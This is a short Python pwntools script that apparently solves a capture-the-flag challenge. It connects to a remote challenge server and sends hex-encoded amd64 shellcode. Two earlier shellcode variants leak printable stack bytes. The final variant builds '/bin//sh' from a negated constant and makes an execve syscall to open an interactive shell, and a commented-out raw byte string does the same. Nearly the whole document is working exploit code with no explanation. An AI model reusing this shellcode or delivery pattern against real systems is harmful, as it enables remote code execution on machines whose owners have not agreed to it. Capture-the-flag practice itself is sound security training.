from pwn import *
import binascii
p = remote('pwn.chall.pwnoh.io', 13377)


sc = asm("""
    add rsp, 0x50
    lea r9, [rsp]
    push r9
    xor rcx, rcx
    mov rax, 1
    mov rdi, 1
    mov rdx, 1
    mov rsi, rsp
    L1:
        mov cl, byte ptr[rsi]
        cmp cl, 0x20
        jl L2 
        cmp cl, 0x7f
        jg L2
        syscall 
    L2:
        inc rsi
        inc rcx
        cmp rcx, 0x10
        jl L1    

 	""",
arch='amd64',
os ='linux'
)


sc = asm("""
    add rsp, 0x52
    lea r9, [rsp]
    push r9
    xor rcx, rcx
    mov rax, 1
    mov rdi, 1
    mov rdx, 1
    mov rsi, rsp
    L1:
        mov cl, byte ptr[rsi]
        cmp cl, 0x20
        jl L2
        cmp cl, 0x7f
        jg L2

        syscall
    L2:
        inc rsi
        inc rcx
        cmp rcx, 0x1
        jl L1    

 	""",
arch='amd64',
os ='linux'
)

sc = asm("""
    add rsp, 0xc0
    lea r9, [rsp]
    push r9


    mov rsi, rsp
    mov cl, byte ptr[rsi]
    shr cl, 0x4
    mov rax, 0x30
    or rax, rcx


    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    syscall
 	""",
arch='amd64',
os ='linux'
)




# sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
res = ""
sc_res =binascii.hexlify(sc)

# for i in sc:
# 	sc_res += hex(i)[2:].rjust(2,'0')
print(sc_res)
p.sendlineafter("hex:\n", sc_res)
#p.recvuntil("...\n")
#leak = u64(p.recv(1).ljust(8,'\0'))
#print "stack_server: ",hex(leak)
#print "stack_local: ",hex(0x52)


p.interactive()
